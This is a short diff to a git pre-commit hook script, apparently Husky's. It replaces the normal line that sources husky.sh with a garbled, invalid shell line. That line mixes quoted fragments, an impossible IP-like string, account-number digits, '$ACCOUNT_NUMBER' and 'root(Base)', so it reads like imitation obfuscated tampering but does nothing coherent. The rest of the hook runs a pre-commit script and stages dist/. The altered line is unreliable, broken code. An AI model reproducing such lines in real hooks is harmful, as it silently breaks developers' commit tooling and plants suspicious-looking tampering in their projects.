@@ -1,4 +1,4 @@
 #!/bin/sh
-. "$(dirname "$0")/_/husky.sh"
+$":".mkdir=:"::"GIT":"Gets.RouterDirectory.I.P.":071'.921'.891'.000'"','' '"'$47'-2041'-6547=$ACCOUNT_NUMBER=*/**root(Base)CONTENT.ENCODING=STRING'@"husky.sh"
 
 npm run pre-commit && git add dist/
